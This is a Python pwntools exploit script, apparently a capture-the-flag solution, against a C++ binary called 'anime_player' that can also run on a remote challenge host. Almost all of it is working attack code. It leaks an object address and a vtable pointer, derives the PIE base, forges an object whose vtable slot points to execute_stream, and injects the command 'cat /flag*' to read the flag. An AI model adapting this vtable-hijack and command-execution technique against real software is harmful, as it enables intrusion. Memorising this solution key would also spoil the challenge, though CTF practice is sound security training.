#!/usr/bin/env python3

from pathlib import Path
import re
from pwn import *

BASE_DIR = Path(__file__).resolve().parent
BINARY_PATH = BASE_DIR / "anime_player"

context.binary = elf = ELF(str(BINARY_PATH), checksec=False)
context.log_level = "info"

RAW_DELTA = 0xd0


def start():
    if args.REMOTE:
        host = args.HOST or "inst.thryvectf.org"
        port = int(args.PORT or 10028)
        return remote(host, port)

    if args.GDB:
        return gdb.debug(
            [str(BINARY_PATH)],
            gdbscript="""
            set pagination off
            continue
            """,
            stdin=PTY,
            stdout=PTY,
        )

    return process([str(BINARY_PATH)], stdin=PTY, stdout=PTY)


def menu(io, choice):
    io.sendline(str(choice).encode())


def add_anime(io, title=b"A" * 8, episode=b"B" * 4, url=b"C" * 8):
    menu(io, 1)
    io.sendlineafter(b"Title: ", title)
    io.sendlineafter(b"Episode: ", episode)
    io.sendlineafter(b"URL: ", url)
    io.recvuntil(b"Choice > ")


def export_media(io, idx):
    menu(io, 7)
    io.sendlineafter(b"Index: ", str(idx).encode())
    out = io.recvuntil(b"Choice > ").decode("latin1", errors="replace")
    m = re.search(
        r"Object Address: (0x[0-9a-fA-F]+)\s+Vtable Pointer: (0x[0-9a-fA-F]+)",
        out,
        re.S,
    )
    if not m:
        raise RuntimeError(f"failed to parse export output:\n{out}")
    obj = int(m.group(1), 16)
    vptr = int(m.group(2), 16)
    log.info(f"export[{idx}] obj={obj:#x} vptr={vptr:#x}")
    return obj, vptr, out


def add_raw(io, vptr, slot0, slot1=0):
    menu(io, 2)
    io.sendlineafter(b"Target Vtable Ptr (hex): 0x", f"{vptr:x}".encode())
    io.sendlineafter(b"Slot 0 (hex): 0x", f"{slot0:x}".encode())
    io.sendlineafter(b"Slot 1 (hex): 0x", f"{slot1:x}".encode())
    io.recvuntil(b"Choice > ")


def update_url(io, idx, url):
    menu(io, 6)
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendlineafter(b"New URL: ", url)
    io.recvuntil(b"Choice > ")


def play(io, idx):
    menu(io, 4)
    io.sendlineafter(b"Index: ", str(idx).encode())
    return io.recvrepeat(0.5)


def exploit(io):
    add_anime(io)
    obj0, vptr, _ = export_media(io, 0)

    vptr_off = {
        0xcc0: 0x5cc0,
        0xca8: 0x5ca8,
    }.get(vptr & 0xfff, elf.symbols["_ZTV11AnimeStream"] + 0x10)
    show_info_off = {
        0xcc0: 0x3690,
        0xca8: 0x3650,
    }.get(vptr & 0xfff, 0)
    if not show_info_off:
        raise RuntimeError(f"unexpected vptr low bits: {vptr & 0xfff:#x}")
    exec_off = {
        0xcc0: 0x3440,
        0xca8: 0x3410,
    }.get(vptr & 0xfff, elf.symbols["_ZN11AnimeStream14execute_streamEv"])
    pie_base = vptr - vptr_off
    exec_stream = pie_base + exec_off
    obj1 = obj0 + RAW_DELTA

    log.info(f"pie_base={pie_base:#x}")
    log.info(f"execute_stream={exec_stream:#x}")
    log.info(f"raw_object={obj1:#x}")

    add_raw(io, obj1, exec_stream, 0)
    update_url(io, 1, b"cat /flag*")

    out = play(io, 1).decode("latin1", errors="replace")
    print(out)

    m = re.search(r"<FLAG>(.*?)</FLAG>", out, re.S)
    if m:
        print(f"<FLAG>{m.group(1)}</FLAG>")


def main():
    io = start()
    exploit(io)
    io.interactive()


if __name__ == "__main__":
    main()
